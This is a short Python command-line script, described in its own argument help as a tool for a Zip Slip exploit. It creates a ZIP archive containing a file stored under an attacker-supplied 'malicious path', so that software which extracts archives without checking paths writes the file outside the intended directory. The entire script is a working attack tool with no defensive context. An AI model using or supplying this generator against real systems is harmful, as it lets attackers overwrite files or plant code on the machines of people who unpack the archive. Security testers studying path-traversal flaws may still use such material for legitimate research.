import zipfile
import os
import argparse

def create_zip(zip_name, file_path, crafted_path):
    # Ensure the crafted path ends with a slash
    if not crafted_path.endswith('/'):
        crafted_path += '/'

    # Extract the filename from the file path
    filename = os.path.basename(file_path)

    # Craft the malicious path
    malicious_path = crafted_path + filename

    # Create a ZIP file with the crafted path
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        zipf.write(file_path, arcname=malicious_path)

    print(f"[+] ZIP file '{zip_name}' created with file '{malicious_path}'.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a ZIP file for a Zip Slip exploit.")
    parser.add_argument("-n", "--name", required=True, help="Name of the output ZIP file.")
    parser.add_argument("-p", "--path", required=True, help="Path to the file to include in the ZIP file.")
    parser.add_argument("-z", "--zip-path", required=True, help="Malicious path to include in the ZIP file.")

    args = parser.parse_args()

    create_zip(args.name, args.path, args.zip_path)
